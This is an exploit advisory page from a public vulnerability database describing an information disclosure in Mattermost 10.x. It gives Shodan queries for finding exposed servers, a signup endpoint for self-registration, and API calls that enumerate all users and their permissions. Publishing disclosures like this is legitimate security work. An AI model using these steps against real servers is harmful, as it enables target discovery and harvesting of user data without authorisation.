---
title: MatterMost information disclosure
url: https://cxsecurity.com/issue/WLB-2025090012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-28
fetch_date: 2025-10-02T20:49:12.031075
---

# MatterMost information disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MatterMost information disclosure** **2025.09.27**  Credit:  **[parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/)**  Risk: **Low**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: MatterMost information disclosure
# Date: 9/26/2025
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: MatterMost (https://mattermost.com)
# Version: 10.\*<=
# Tested on: Linux/Windows
Step 1 : attacker with these shodan queries can find the target
https://www.shodan.io/search?query=http.component%3A%22mattermost%22+%22X-Version-Id%3A+10.9.\*%22
https://www.shodan.io/search?query=http.component%3A%22mattermost%22+%22X-Version-Id%3A+10.10.1%22
Step 2 : Attacker can signup with this endpoint
For example : http://TARGET\_IP:TARGET\_PORT/signup\_user\_complete
Step 3 : After create account attacker can use these api endpoints to find juice information
https://TARGET\_URL/api/v4/users/me --> Attacker Information
https://TARGET\_URL/api/v4/users?per\_page=200&page=0 --> Find All users after authentication
https://TARGET\_URL/api/v4/users/username/TARGET\_USERNAME --> Find username permission
notice about per\_page : per\_page mean about list of users that show AND send the up requests as GET .

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top